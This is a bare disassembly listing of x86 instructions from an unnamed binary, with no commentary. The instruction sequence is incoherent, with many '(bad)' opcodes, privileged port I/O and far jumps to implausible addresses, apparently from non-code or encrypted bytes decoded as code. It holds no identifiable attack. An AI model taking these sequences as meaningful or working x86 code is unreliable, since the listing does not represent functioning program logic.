  412b7c:	sub    dl,BYTE PTR [edi]
  412b7e:	sub    cl,ch
  412b80:	sub    DWORD PTR [ebp-0x1b],0xffffffe6
  412b84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b85:	add    eax,0xeec3dbfa
  412b8a:	sar    DWORD PTR [ecx],0xeb
  412b8d:	data16 (bad) 
  412b8f:	mov    ds:0x16bd31d8,eax
  412b94:	les    edx,FWORD PTR [ecx+ecx*4-0x64be69d1]
  412b9b:	mov    DWORD PTR cs:[edi+0x724fbb58],esp
  412ba2:	aam    0xc8
  412ba4:	sbb    DWORD PTR [eax+edx*8],edi
  412ba7:	shr    esp,cl
  412ba9:	out    0x57,eax
  412bab:	out    0x18,al
  412bad:	jnp    0x412bb6
  412baf:	hlt    
  412bb0:	push   ebx
  412bb1:	jmp    0x25620709
  412bb6:	jnp    0x412c1d
  412bb8:	sub    BYTE PTR [edi],bl
  412bba:	add    al,0xc8
  412bbc:	imul   esi,DWORD PTR [edi+0x36],0x40beea97
  412bc3:	ret    0x7a02
  412bc6:	add    esi,esi
  412bc8:	push   edx
  412bc9:	aam    0x2a
  412bcb:	mov    ecx,0xf0c62ed4
  412bd0:	shl    DWORD PTR [edi-0x31173237],1
  412bd6:	xor    al,0x69
  412bd8:	leave  
  412bd9:	mov    edx,0x45e55209
  412bde:	mov    gs:0x4a575cb3,eax
  412be4:	into   
  412be5:	test   al,0xb6
  412be7:	sbb    edi,DWORD PTR [ebx-0x54]
  412bea:	sub    bh,BYTE PTR [ebx+eax*1-0x28]
  412bee:	and    ecx,DWORD PTR [ebx+0x54dac4a6]
  412bf4:	stc    
  412bf5:	adc    BYTE PTR [edi+0xcb7a0ef],al
  412bfb:	jbe    0x412baa
  412bfd:	jnp    0x412c66
  412bff:	adc    DWORD PTR [edx+0x7f],ebx
  412c02:	dec    ebx
  412c03:	pop    esi
  412c04:	jne    0x412c45
  412c06:	mov    eax,ds:0x685c089
  412c0b:	test   BYTE PTR [edi-0xf8244d6],dh
  412c11:	and    esi,esi
  412c13:	stos   DWORD PTR es:[edi],eax
  412c14:	mov    ds:0x58e12df0,al
  412c19:	es xor al,0xb
  412c1c:	icebp  
  412c1d:	mov    ebx,edx
  412c1f:	je     0x412c5b
  412c21:	push   ecx
  412c22:	push   0x4f7b58f1
  412c27:	add    bl,BYTE PTR [edi+0xf87de16]
  412c2d:	push   ebp
  412c2e:	icebp  
  412c2f:	mov    ch,0x2f
  412c31:	stc    
  412c32:	loopne 0x412c5d
  412c34:	out    dx,eax
  412c35:	out    0xff,al
  412c37:	fidiv  DWORD PTR [ecx-0x4ddd58f7]
  412c3d:	jo     0x412bf3
  412c3f:	add    DWORD PTR fs:[edx-0x5f],eax
  412c43:	dec    ebx
  412c44:	mov    bh,0x8b
  412c46:	inc    bp
  412c48:	and    ch,BYTE PTR [ecx]
  412c4a:	push   esp
  412c4b:	xchg   esp,eax
  412c4c:	mov    BYTE PTR gs:0x7cd09ada,dh
  412c53:	mov    al,0xa9
  412c55:	push   ebp
  412c56:	pop    esi
  412c57:	adc    BYTE PTR [ebx-0x5ab28c0c],0xbd
  412c5e:	push   cs
  412c5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412c60:	outs   dx,DWORD PTR ds:[esi]
  412c61:	lahf   
  412c62:	inc    ebp
  412c63:	add    ecx,ebx
  412c65:	out    dx,eax
  412c66:	out    dx,eax
  412c67:	(bad)  
  412c69:	sbb    BYTE PTR [edx-0x24],cl
  412c6c:	adc    BYTE PTR [esi-0x79028573],0x3a
  412c73:	ror    BYTE PTR [ecx+0x791616e9],1
  412c79:	int3   
  412c7a:	mov    ebp,0x702020c
  412c7f:	add    eax,esp
  412c81:	xor    al,0xd1
  412c83:	jge    0x412ce5
  412c85:	mov    eax,ds:0x7ae42f
  412c8a:	push   ds
  412c8b:	ret    
  412c8c:	sahf   
  412c8d:	jge    0x412cbe
  412c8f:	push   edi
  412c90:	call   0x4bcc1a62
  412c95:	shl    BYTE PTR [esi+0x292f3648],1
  412c9b:	js     0x412c65
  412c9d:	add    al,0xbd
  412c9f:	xor    ebx,eax
  412ca1:	icebp  
  412ca2:	repz inc BYTE PTR [edx]
  412ca5:	je     0x412d22
  412ca7:	and    BYTE PTR [eax-0x2dd3bd43],ah
  412cad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412cae:	call   0x7adedecc
  412cb3:	dec    esi
  412cb4:	jb     0x412cdf
  412cb6:	adc    ch,BYTE PTR ds:0x49c3e604
  412cbc:	sti    
  412cbd:	xor    eax,ecx
  412cbf:	xchg   esp,eax
  412cc0:	sbb    ecx,DWORD PTR [edi+0x48]
  412cc3:	mov    dl,BYTE PTR [esi+eiz*8+0x32]
  412cc7:	inc    esi
  412cc8:	mov    DWORD PTR [ecx+0x4e8cb0f8],ebx
  412cce:	fptan  
  412cd0:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  412cd2:	sbb    al,0x27
  412cd4:	inc    eax
  412cd5:	xor    DWORD PTR [ebx-0x34352eb0],esi
  412cdb:	dec    ebx
  412cdc:	pop    edi
  412cdd:	ret    
  412cde:	mov    ds:0x99687f5f,al
  412ce3:	sbb    al,0x93
  412ce5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412ce6:	les    edi,FWORD PTR [eax+0x7351396a]
  412cec:	repz or dl,al
  412cef:	add    ch,BYTE PTR [edi+0x6a8c51a]
  412cf5:	xor    DWORD PTR [edx-0x63],0x394efdb4
  412cfc:	dec    ebx
  412cfd:	cdq    
  412cfe:	inc    edi
  412cff:	lock mov ebp,ebx
  412d02:	test   BYTE PTR [ebx-0x4fdcf66f],bh
  412d08:	push   ebx
  412d09:	test   eax,0x96973663
  412d0e:	out    0x40,al
  412d10:	mov    ds:0x3eaf2f7c,eax
  412d15:	or     eax,0x12e08736
  412d1a:	mov    eax,ds:0x7e231a6b
  412d1f:	mov    ch,0x5
  412d21:	xor    eax,0xabe7d072
  412d26:	mov    bl,0x56
  412d28:	adc    al,0x1d
  412d2a:	xchg   BYTE PTR [ebx+0x55],cl
  412d2d:	jo     0x412d50
  412d2f:	mov    ah,0xba
  412d31:	or     dh,BYTE PTR [edi-0x185bf91b]
  412d37:	mov    ch,BYTE PTR [ebp-0x45]
  412d3a:	inc    ebx
  412d3b:	icebp  
  412d3c:	test   DWORD PTR [ecx-0x300f2591],0xbf01a90
  412d46:	(bad)  
  412d47:	pop    ecx
  412d48:	mov    cs,WORD PTR [ebx+0x16]
  412d4b:	add    al,0xd1
  412d4d:	dec    edx
  412d4e:	mov    ecx,0x19a3fb51
  412d53:	adc    DWORD PTR [edx+edi*2+0x32],ecx
  412d57:	push   cs
  412d58:	mov    ebx,0x567915ea
  412d5d:	pop    edx
  412d5e:	out    0x75,al
  412d60:	xchg   DWORD PTR [ecx+0x2394d6d2],ebp
  412d66:	and    eax,0xabaace17
  412d6b:	daa    
  412d6c:	dec    edx
  412d6d:	stos   BYTE PTR es:[edi],al
  412d6e:	dec    ebx
  412d6f:	loope  0x412dc5
  412d71:	cmp    DWORD PTR [eax],edi
  412d73:	call   FWORD PTR [ebx+ebp*2]
  412d76:	retf   
  412d77:	or     al,0x79
  412d79:	clc    
  412d7a:	enter  0xcbe2,0x96
  412d7e:	dec    eax
  412d7f:	je     0x412de1
  412d81:	inc    ecx
  412d82:	hlt    
  412d83:	pop    ecx
  412d84:	enter  0xfd5d,0x5b
  412d88:	mov    dl,0x2a
  412d8a:	cmp    edi,DWORD PTR [ebx+0x67]
  412d8d:	dec    ebp
  412d8e:	fldcw  WORD PTR [ebx+0x3e]
  412d91:	jns    0x412d19
  412d93:	sub    ecx,DWORD PTR [ebp+0x6f]
  412d96:	push   esi
  412d97:	test   al,0xb1
  412d99:	xchg   edi,eax
  412d9a:	nop
  412d9b:	retf   
  412d9c:	loopne 0x412d6b
  412d9e:	outs   dx,BYTE PTR ds:[esi]
  412d9f:	lds    esi,FWORD PTR [edi+0x758792b8]
  412da5:	sub    dh,dh
  412da7:	ins    DWORD PTR es:[edi],dx
  412da8:	push   edi
  412da9:	mov    ah,ah
  412dab:	jne    0x412d6b
  412dad:	iret   
  412dae:	cli    
  412daf:	popa   
  412db0:	not    BYTE PTR [edi+0x115522ce]
  412db6:	out    dx,al
  412db7:	int    0x33
  412db9:	dec    ebx
  412dba:	add    eax,0x6be1fc2c
  412dbf:	clc    
  412dc0:	into   
  412dc1:	ins    BYTE PTR es:[edi],dx
  412dc2:	add    DWORD PTR [edi+0x6f],0xe9c8bbc6
  412dc9:	xchg   ebx,eax
  412dca:	xlat   BYTE PTR ds:[ebx]
  412dcb:	push   es
  412dcc:	mov    ebx,DWORD PTR [edi]
  412dce:	jo     0x412d95
  412dd0:	dec    esp
  412dd1:	fisub  WORD PTR [ecx]
  412dd3:	pushf  
  412dd4:	jb     0x412e0b
  412dd6:	and    bh,bh
  412dd8:	cmp    bh,BYTE PTR [ebx]
  412dda:	inc    edi
  412ddb:	and    cl,dl
  412ddd:	mov    ebp,0x6b43eb7f
  412de2:	call   0x761b:0x662e28fa
  412de9:	stos   DWORD PTR es:[edi],eax
  412dea:	jg     0x412e12
  412dec:	or     DWORD PTR [ebx+0x1b1c6109],edi
  412df2:	inc    esp
  412df3:	cmp    ch,BYTE PTR [ebx-0x321fbf47]
  412df9:	sbb    BYTE PTR [esi+esi*1+0x19aefc90],bh
  412e00:	cmp    al,0x3f
  412e02:	cmc    
  412e03:	dec    esp
  412e04:	(bad)  [edi+eax*8+0x22]
  412e08:	ja     0x412dde
  412e0a:	pop    ebx
  412e0b:	jmp    DWORD PTR [ebx+0xba54475]
  412e11:	cmp    DWORD PTR [ecx-0x2b83c70],0x4b
  412e18:	les    ebp,FWORD PTR [edx+0x52520ab0]
  412e1e:	sti    
  412e1f:	lock push esp
  412e21:	outs   dx,BYTE PTR ds:[esi]
  412e22:	pop    es
  412e23:	sti    
  412e24:	mov    ds:0x61a12296,al
  412e29:	jmp    FWORD PTR [esi+0x2380bcfa]
  412e2f:	jmp    0x28e3:0x5e10cc74
  412e36:	mov    ecx,0x6a5ca813
  412e3b:	mov    dl,dh
  412e3d:	cdq    
  412e3e:	fsub   DWORD PTR [edi]
  412e40:	sbb    DWORD PTR [esi],edi
  412e42:	mov    esi,0x1a122ea3
  412e47:	cmp    edx,DWORD PTR [esi+0x57266c0d]
  412e4d:	mov    eax,ds:0x779c16f7
  412e52:	cmp    esi,0xffffffdb
  412e55:	sbb    edx,DWORD PTR [ebx]
  412e57:	xor    esp,DWORD PTR [esi]
  412e59:	pop    edi
  412e5a:	mov    al,0x12
  412e5c:	cmp    esi,DWORD PTR [esi+0x4b]
  412e5f:	fild   WORD PTR [ecx+0x3e]
  412e62:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412e63:	outs   dx,BYTE PTR ds:[esi]
  412e64:	stos   DWORD PTR es:[edi],eax
  412e65:	pusha  
  412e66:	ss daa 
  412e68:	or     esp,ebx
  412e6a:	mov    dh,0xc8
  412e6c:	imul   esi,DWORD PTR [ecx-0x78a54763],0x91758077
  412e76:	or     al,0x67
  412e78:	imul   DWORD PTR [edi-0x6fcf67ad]
  412e7e:	mov    DWORD PTR [edx-0x80],edx
  412e81:	adc    al,0x74
  412e83:	sbb    al,0x13
  412e85:	sub    eax,0xf933165b
  412e8a:	xchg   BYTE PTR [eax-0x7f49d76c],al
  412e90:	sbb    ch,BYTE PTR [eax+0x3373b418]
  412e96:	add    ebp,DWORD PTR ss:[edi+0x20151354]
  412e9d:	in     eax,0x89
  412e9f:	loope  0x412f09
  412ea1:	in     al,0x38
  412ea3:	sbb    eax,0x1fbbbd1f
  412ea8:	sbb    al,0x99
  412eaa:	out    dx,al
  412eab:	lahf   
  412eac:	mov    bl,0x8a
  412eae:	jmp    0x476ec604
  412eb3:	arpl   si,dx
  412eb5:	aas    
  412eb6:	shl    BYTE PTR [eax-0x1b],cl
  412eb9:	dec    esp
  412eba:	and    esi,edx
  412ebc:	xor    al,0x25
  412ebe:	mov    eax,ds:0x7f2a592a
  412ec3:	ins    BYTE PTR es:[edi],dx
  412ec4:	cmp    eax,0x75c0e402
  412ec9:	gs cmp al,0x76
  412ecc:	dec    eax
  412ecd:	dec    edx
  412ece:	in     al,dx
  412ecf:	pop    es
  412ed0:	xchg   ebx,eax
  412ed1:	push   ecx
  412ed2:	das    
  412ed3:	fwait
  412ed4:	mov    esi,0x74f2797
  412ed9:	mov    bh,0x5a
  412edb:	mov    edi,0x6ab82149
  412ee0:	imul   ebp,DWORD PTR [eax+0x4dd02252],0xb2447fd5
  412eea:	mov    bh,0x26
  412eec:	push   edi
  412eed:	imul   esp,DWORD PTR [eax+0x3d],0xfffffffa
  412ef1:	cld    
  412ef2:	xchg   ecx,eax
  412ef3:	fimul  DWORD PTR [esi+0x2]
  412ef6:	xor    al,0x2c
  412ef8:	cmp    DWORD PTR [ebp+0x52],edx
  412efb:	call   0x5f51:0x5a10768c
  412f02:	rcr    dh,1
  412f04:	xchg   DWORD PTR [edx+0x40f4defb],edx
  412f0a:	add    bh,BYTE PTR [edx]
  412f0c:	(bad)  
  412f0d:	dec    esi
  412f0e:	sub    eax,0xc33e81f9
  412f13:	dec    eax
  412f14:	sub    DWORD PTR [eax],0xcda13812
  412f1a:	cld    
  412f1b:	cmc    
  412f1c:	mov    ecx,0xbdc93831
  412f21:	dec    eax
  412f22:	(bad)  
  412f24:	iret   
  412f25:	xor    ebx,DWORD PTR [ebx+edx*8-0x5997d50e]
  412f2c:	lds    ebp,FWORD PTR [ecx-0x54]
  412f2f:	mov    cl,0x48
  412f31:	push   cs
  412f32:	cmp    al,BYTE PTR [ecx]
  412f34:	in     al,dx
  412f35:	les    ebp,FWORD PTR [eax+eiz*2]
  412f38:	std    
  412f39:	das    
  412f3a:	sbb    BYTE PTR [edi+0x519dd92d],al
  412f40:	cli    
  412f41:	mov    cl,0xea
  412f43:	pop    DWORD PTR [ebx-0x2c]
  412f46:	pusha  
  412f47:	or     eax,0x496ab439
  412f4c:	js     0x412f23
  412f4e:	sbb    edx,DWORD PTR [ebx+ebx*2+0x7c]
  412f52:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412f53:	mov    edx,esp
  412f55:	imul   edx,DWORD PTR [ebx],0xfffffffd
  412f58:	sub    DWORD PTR ds:0xc59f8940,0x4e433b26
  412f62:	call   0x8e7d5324
  412f67:	out    dx,eax
  412f68:	retf   0x512f
  412f6b:	mov    ch,0xc2
  412f6d:	or     BYTE PTR [edx+0x786826c1],dh
  412f73:	ret    
  412f74:	pushf  
  412f75:	inc    esp
  412f76:	xchg   ecx,eax
  412f77:	mov    esp,0x134013fc
  412f7c:	icebp  
  412f7d:	pop    eax
  412f7e:	test   BYTE PTR [ecx+0xfeac62b],cl
  412f84:	test   al,0xa0
  412f86:	mov    al,0xaf
  412f88:	pop    edx
  412f89:	xor    eax,0x35ab1835
  412f8e:	stc    
  412f8f:	pand   mm7,mm0
  412f92:	mov    ds:0x232063f2,al
  412f97:	sub    ch,bh
  412f99:	popa   
  412f9a:	out    dx,al
  412f9b:	sbb    dh,ch
  412f9d:	or     ebp,DWORD PTR [edi]
  412f9f:	arpl   WORD PTR [ecx],di
  412fa1:	bound  ecx,QWORD PTR [ebp+0x1e98517f]
  412fa7:	out    0xe3,eax
  412fa9:	and    eax,0x2c7f9448
  412fae:	and    ch,BYTE PTR [ecx+0x12]
  412fb1:	rcr    bh,1
  412fb3:	loope  0x412fae
  412fb5:	loopne 0x412faf
  412fb7:	shl    DWORD PTR [edi+0x75],cl
  412fba:	mov    edi,0x8e7f0f11
  412fbf:	das    
  412fc0:	adc    ch,dh
  412fc2:	or     al,0x3d
  412fc4:	xor    DWORD PTR [ebp+0x77],ecx
  412fc7:	pop    eax
  412fc8:	pop    edx
  412fc9:	or     eax,0x4994e628
  412fce:	mov    edx,0x3ff76bf3
  412fd3:	stos   BYTE PTR es:[edi],al
  412fd4:	jmp    DWORD PTR ds:0xab1d479f
  412fda:	dec    eax
  412fdb:	cdq    
  412fdc:	cli    
  412fdd:	test   DWORD PTR [edx+0x6beecb5f],0xca407ab6
  412fe7:	push   es
  412fe8:	gs or  eax,0xdca70f81
  412fee:	in     eax,dx
  412fef:	out    0x82,al
  412ff1:	es loopne 0x412ff6
  412ff4:	push   esp
  412ff5:	inc    ebx
  412ff6:	and    al,0xb7
  412ff8:	adc    DWORD PTR [si],ebx
  412ffb:	jae    0x413075
  412ffd:	xchg   BYTE PTR [edi],cl
  412fff:	stos   DWORD PTR es:[edi],eax
  413000:	cmp    bl,BYTE PTR [eax-0x38]
  413003:	clc    
  413004:	popa   
  413005:	lahf   
  413006:	out    0x24,eax
  413008:	mov    eax,ds:0x3ad1a95a
  41300d:	imul   BYTE PTR [ebp+ecx*8-0x1d5492f4]
  413014:	aam    0xae
  413016:	not    DWORD PTR [esi+0x6c84957e]
  41301c:	jp     0x41305d
  41301e:	and    DWORD PTR [eax],0xffffffbe
  413021:	or     eax,0xcea65ac5
  413026:	fisttp DWORD PTR [ebp+0x1eda9796]
  41302c:	cdq    
  41302d:	jns    0x412fca
  41302f:	inc    ebp
  413030:	lock pop ebx
  413032:	sahf   
  413033:	mov    ebp,0xc6c8ea38
  413038:	and    esp,DWORD PTR [edi+0x7f4d40eb]
  41303e:	pop    ebp
  41303f:	cld    
  413040:	pop    ecx
  413041:	outs   dx,DWORD PTR ds:[esi]
  413042:	out    0xb9,eax
  413044:	mov    eax,0x3c7fccdf
  413049:	in     eax,dx
  41304a:	jge    0x41308c
  41304c:	jle    0x4130b2
  41304e:	jecxz  0x413084
  413050:	sbb    al,0xbf
  413052:	xchg   ecx,eax
  413053:	mov    ds:0x83d13470,al
  413058:	pop    ds
  413059:	jmp    0xbccd:0xc513a87d
  413060:	call   0x8f0ad8aa
  413065:	xor    al,0xb
  413067:	retf   0xdcf4
  41306a:	add    eax,0x926b2c69
  41306f:	add    al,0x76
  413071:	popa   
  413072:	push   esp
  413073:	pusha  
  413074:	mov    ch,0xa1
  413076:	cmp    ecx,0x1f
  413079:	sbb    eax,0xa6646f65
  41307e:	loopne 0x41301d
  413080:	rol    DWORD PTR [eax-0x80],0x0
  413084:	fstp   QWORD PTR [eax+0x1c]
  413087:	mov    cl,BYTE PTR [ebx-0x4a]
  41308a:	jp     0x413044
  41308c:	xchg   ebp,eax
  41308d:	aas    
  41308e:	retf   
  41308f:	adc    al,0x7b
  413091:	sar    DWORD PTR [edi],1
  413093:	cmp    eax,0xafd82d1
  413098:	jle    0x413023
  41309a:	ds xchg esi,eax
  41309c:	std    
  41309d:	mov    es,WORD PTR [edi+0x10]
  4130a0:	jnp    0x41311d
  4130a2:	cs sbb esi,ebp
  4130a5:	and    edx,DWORD PTR [ebp-0x3b]
  4130a8:	add    eax,0x4fa54194
  4130ad:	fs mov al,0x9b
  4130b0:	inc    edi
  4130b1:	add    edi,0xffffffa5
  4130b4:	ins    DWORD PTR es:[edi],dx
  4130b5:	mov    dh,0xbe
  4130b7:	es dec esi
  4130b9:	jmp    0xf67b:0xbdf3aa6d
  4130c0:	ins    DWORD PTR es:[edi],dx
  4130c1:	imul   esi,DWORD PTR [ebx+0x5f],0x3f
  4130c5:	push   ebp
  4130c6:	adc    eax,0x5e9084e5
  4130cb:	add    al,0x50
  4130cd:	fnsave [eax-0x271c1114]
  4130d3:	fisttp DWORD PTR [edx+0x63]
  4130d6:	add    BYTE PTR [ebp-0x73],ch
  4130d9:	inc    eax
  4130da:	mov    eax,ds:0xce6c90ff
  4130df:	ins    BYTE PTR es:[edi],dx
  4130e0:	(bad)
  4130e4:	sti    
  4130e5:	(bad)  
  4130e6:	xor    ch,BYTE PTR [edx-0x7b9573d]
  4130ec:	enter  0x6ee4,0x54
  4130f0:	mov    eax,0x2ae91f06
  4130f5:	in     eax,dx
  4130f6:	or     eax,0xbfda1c61
  4130fb:	sub    DWORD PTR [esi-0x2400a3eb],ecx
  413101:	inc    esp
  413102:	push   ss
  413103:	loopne 0x4130ac
  413105:	in     al,dx
  413106:	pop    edi
  413107:	cmp    bl,BYTE PTR [eax-0x19]
  41310a:	inc    ebp
  41310b:	fcomip st,st(7)
  41310d:	mov    ch,0x6c
  41310f:	jge    0x413120
  413111:	jmp    0xc7767c71
  413116:	mov    bl,BYTE PTR [esi-0x3a41861c]
  41311c:	js     0x4130e3
  41311e:	hlt    
  41311f:	push   ebp
  413120:	(bad)  
  413121:	sti    
  413122:	sti    
  413123:	xchg   esp,eax
  413124:	sub    ebx,DWORD PTR [edx+0x660adbce]
  41312a:	mov    ecx,0x99cf5b97
  41312f:	ss stc 
  413131:	movd   eax,mm5
  413134:	sub    DWORD PTR [eax],esp
  413136:	into   
  413137:	jge    0x4130be
  413139:	adc    eax,DWORD PTR [esi-0x1ecc0bfd]
  41313f:	cwde   
  413140:	xor    BYTE PTR [ebx],0x12
  413143:	xor    BYTE PTR [edx+eiz*1],ah
  413146:	pop    ss
  413147:	push   0x1fe1d2
  41314c:	loope  0x413132
  41314e:	xchg   DWORD PTR [ecx+0x6b3945b3],esi
  413154:	cmc    
  413155:	push   ebx
  413156:	in     al,0x1e
  413158:	or     al,0x8
  41315a:	push   esi
  41315b:	mov    ds:0x5599373c,al
  413160:	je     0x41318f
  413162:	add    al,0x3e
  413164:	adc    eax,0xfdd22c31
  413169:	shl    bl,1
  41316b:	xor    eax,0x35586b50
  413170:	mov    edi,0x3a9c140c
  413175:	pop    ebp
  413176:	sbb    DWORD PTR [edx+ebx*4+0x270de879],0xc5827d59
  413181:	(bad)  
  413182:	mov    ecx,0xda034049
  413187:	xchg   ecx,eax
  413188:	xchg   edi,eax
  413189:	mov    eax,ds:0x33273ddb
  41318e:	or     cl,dl
  413190:	call   0x7e7f:0xbacbdde8
  413197:	nop
  413198:	rcl    bl,1
  41319a:	xchg   edi,eax
  41319b:	sbb    ah,BYTE PTR [ecx-0x42]
  41319e:	call   0xe98137bc
  4131a3:	add    al,0x18
  4131a5:	xchg   DWORD PTR [ebp+0x3c],ebp
  4131a8:	mov    edx,0x43e0345a
  4131ad:	std    
  4131ae:	and    eax,0x228fe29a
  4131b3:	ja     0x413216
  4131b5:	sub    dh,BYTE PTR [ebp-0x21]
  4131b8:	xchg   esp,eax
  4131b9:	call   0xae5885fb
  4131be:	repnz (bad) 
  4131c0:	cli    
  4131c1:	mov    BYTE PTR [ebp+0x72f8efad],al
  4131c7:	(bad)  
  4131c8:	xchg   esi,eax
  4131c9:	fwait
  4131ca:	aas    
  4131cb:	mov    eax,0x927df70f
  4131d0:	stc    
  4131d1:	int3   
  4131d2:	ins    DWORD PTR es:[edi],dx
  4131d3:	mov    ebx,0xfe5757c1
  4131d8:	sbb    BYTE PTR [esi+ecx*1+0x7d5ecae6],0x83
  4131e0:	scas   al,BYTE PTR es:[edi]
  4131e1:	cmp    edi,DWORD PTR [ecx]
  4131e3:	xlat   BYTE PTR ds:[ebx]
  4131e4:	stc    
  4131e5:	sbb    DWORD PTR [edi+esi*1-0x5d3d9e3e],ecx
  4131ec:	test   DWORD PTR [ecx],ebx
  4131ee:	xchg   ecx,eax
  4131ef:	daa    
  4131f0:	inc    esp
  4131f1:	jo     0x413244
  4131f3:	mov    eax,ds:0x1d41c710
  4131f8:	and    BYTE PTR [edi-0x627499e1],al
  4131fe:	lods   eax,DWORD PTR ds:[esi]
  4131ff:	jecxz  0x4131a5
  413201:	and    esp,0x2
  413204:	jg     0x41323c
  413206:	retf   0xf231
  413209:	cs push ecx
  41320b:	div    BYTE PTR [eax-0x34c8c637]
  413211:	cmp    BYTE PTR [esi],dh
  413213:	jle    0x413241
  413215:	sar    DWORD PTR [edx+0x4a49d179],0x9e
  41321c:	push   edi
  41321d:	test   esp,ebp
  41321f:	mov    ds:0x5eeea7a7,al
  413224:	imul   esp,DWORD PTR [edx+0x1d],0xffffffa6
  413228:	xlat   BYTE PTR ds:[ebx]
  413229:	jg     0x413211
  41322b:	jns    0x41320c
  41322d:	push   ss
  41322e:	dec    esi
  41322f:	lock adc ecx,DWORD PTR [ecx+ebx*2]
  413233:	js     0x4131cd
  413235:	outs   dx,BYTE PTR ds:[esi]
  413236:	xlat   BYTE PTR cs:[ebx]
  413238:	push   cs
  413239:	mul    DWORD PTR [esp+eiz*2]
  41323c:	repz push esi
  41323e:	jge    0x413291
  413240:	(bad)  [ebx+0xa]
  413243:	in     eax,dx
  413244:	jb     0x41328f
  413246:	fisub  WORD PTR [edx]
  413248:	add    al,0x4b
  41324a:	test   al,0xca
  41324c:	add    DWORD PTR [esi+0x621c6dfc],0x9702c434
  413256:	and    al,0x8a
  413258:	push   ebp
  413259:	js     0x413293
  41325b:	sbb    eax,0xa9ef6cc6
  413260:	jae    0x413255
  413262:	aaa    
  413263:	in     al,0xd1
  413265:	pop    edx
  413266:	push   edi
  413267:	add    ch,cl
  413269:	xchg   BYTE PTR [ebp+0x4a],dh
  41326c:	fs mov ebp,0x7a4778ed
  413272:	into   
  413273:	shr    al,1
  413275:	in     eax,0x23
  413277:	or     eax,0xeb1ff415
  41327c:	mov    al,ds:0x3acc1a31
  413281:	and    dl,bh
  413283:	mov    edi,0x952c903d
  413288:	shl    DWORD PTR [ebp+0x3d],cl
  41328b:	inc    esi
  41328c:	je     0x413225
  41328e:	(bad)  
  413290:	nop
  413291:	in     eax,0xc6
  413293:	pop    edi
  413294:	dec    ebp
  413295:	popa   
  413296:	test   DWORD PTR fs:[esi],ebp
  413299:	sub    al,0xc4
  41329b:	ret    
  41329c:	push   es
  41329d:	loopne 0x41325d
  41329f:	stos   DWORD PTR es:[edi],eax
  4132a0:	fist   WORD PTR [ecx+0x14192a0c]
  4132a6:	xchg   ebx,eax
  4132a7:	ds das 
  4132a9:	jo     0x41326f
  4132ab:	std    
  4132ac:	pop    edx
  4132ad:	sub    BYTE PTR [edi+eax*1],al
  4132b0:	xor    al,BYTE PTR ds:0x2bc87341
  4132b6:	out    0x61,al
  4132b8:	ret    0x8f60
  4132bb:	xor    DWORD PTR [edx],eax
  4132bd:	dec    edi
  4132be:	inc    esi
  4132bf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4132c0:	out    0xc1,eax
  4132c2:	or     DWORD PTR [ebp-0x2d],ebp
  4132c5:	loop   0x4132a4
  4132c7:	jle    0x41324e
  4132c9:	adc    ch,BYTE PTR [edx+0x16]
  4132cc:	(bad)  
  4132cd:	int3   
  4132ce:	mov    ebx,0xf1736953
  4132d3:	and    al,0xaf
  4132d5:	mov    ch,0x61
  4132d7:	mov    ah,BYTE PTR [ecx+0x63e8575d]
  4132dd:	cmp    DWORD PTR [eax],ebx
  4132df:	sub    BYTE PTR [ebp+0x66],ch
  4132e2:	out    dx,al
  4132e3:	jbe    0x4132e4
  4132e5:	mov    ds,WORD PTR ds:0xd9645a42
  4132eb:	adc    eax,0x67620ca7
  4132f0:	xchg   esi,eax
  4132f1:	push   ss
  4132f2:	fnstcw WORD PTR [ebx+0xa]
  4132f5:	cmp    ecx,DWORD PTR [edi+0x61a474d6]
  4132fb:	push   ss
  4132fc:	adc    DWORD PTR [edi+edx*1],edi
  4132ff:	mov    al,ds:0x6ffe0424
  413304:	ss and eax,0x951dfcf1
  41330a:	frstor [ebp+0x5a5ac713]
  413310:	jbe    0x413359
  413312:	retf   
  413313:	sti    
  413314:	in     eax,dx
  413315:	lea    edx,[edx]
  413317:	cmp    eax,0x5c72c91f
  41331c:	jg     0x4132f0
  41331e:	sbb    al,BYTE PTR [edx-0x7e900247]
  413324:	push   esi
  413325:	dec    esp
  413326:	iret   
  413327:	mov    edx,0xf6aae829
  41332c:	pop    esp
  41332d:	push   ds
  41332e:	sbb    ch,BYTE PTR [edx-0x35]
  413331:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413332:	fcmovbe st,st(3)
  413334:	mov    edi,DWORD PTR [edi-0x3e]
  413337:	imul   DWORD PTR [ecx-0x7a7d8245]
  41333d:	pusha  
  41333e:	mov    ch,0x84
  413340:	fwait
  413341:	or     DWORD PTR [edx+0x2],0x574e4ec2
  413348:	jae    0x4132e2
  41334a:	int    0x83
  41334c:	mov    eax,0xc82fb920
  413351:	call   0x55ea6e3
  413356:	sub    eax,0x1810a4c3
  41335b:	push   ss
  41335c:	jle    0x413355
  41335e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41335f:	dec    esp
  413360:	sub    ch,BYTE PTR [ebp-0x74]
  413363:	ins    DWORD PTR es:[edi],dx
  413364:	push   ds
  413365:	enter  0xff77,0x8d
  413369:	mov    eax,ds:0x85eb1333
  41336e:	and    eax,0xa45b7b7b
  413373:	jecxz  0x4133cd
  413375:	test   dl,bh
  413377:	sbb    ebx,ebx
  413379:	dec    edi
  41337a:	push   eax
  41337b:	adc    DWORD PTR [eax-0x3d],edi
  41337e:	outs   dx,DWORD PTR ds:[esi]
  41337f:	test   al,0x5
  413381:	pop    esp
  413382:	push   edi
  413383:	mov    esi,0xb5481af2
  413388:	lahf   
  413389:	ins    DWORD PTR es:[edi],dx
  41338a:	jbe    0x4133f5
  41338c:	mov    ds:0xa26e2c38,al
  413391:	arpl   WORD PTR [ecx-0x62e4e891],bx
  413397:	push   0x699507c6
  41339c:	outs   dx,BYTE PTR ds:[esi]
  41339d:	xchg   ebp,eax
  41339e:	rcr    cl,0x1c
  4133a1:	push   cs
  4133a2:	loope  0x4133f4
  4133a4:	mov    eax,ds:0xdbb32d0e
  4133a9:	sbb    BYTE PTR [ecx+ecx*4+0x4fcfcd76],bl
  4133b0:	and    eax,0xf1ca0133
  4133b5:	test   al,0xdf
  4133b7:	outs   dx,DWORD PTR ds:[esi]
